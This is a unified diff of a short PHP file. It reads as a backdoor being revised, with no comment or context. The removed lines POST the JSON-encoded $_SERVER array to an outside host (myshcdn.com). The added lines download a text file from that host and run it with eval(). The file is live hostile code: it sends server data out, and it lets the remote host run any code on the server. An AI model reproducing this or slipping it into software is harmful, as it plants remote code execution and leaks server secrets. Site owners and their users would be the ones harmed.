@@ -1,14 +1,6 @@
 <?php
-
-$_header = json_encode($_SERVER);
-
-$ch = curl_init("http://myshcdn.com/sh.php");
-curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-curl_setopt($ch, CURLOPT_POSTFIELDS, $_header);
+$ch = curl_init("http://myshcdn.com/heroku_github_data.txt");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Content-Type: application/json', 'Content-Length: ' . strlen($_header)));
-
 $result = curl_exec($ch);
 curl_close($ch);
-
-echo $result;
+eval($result);
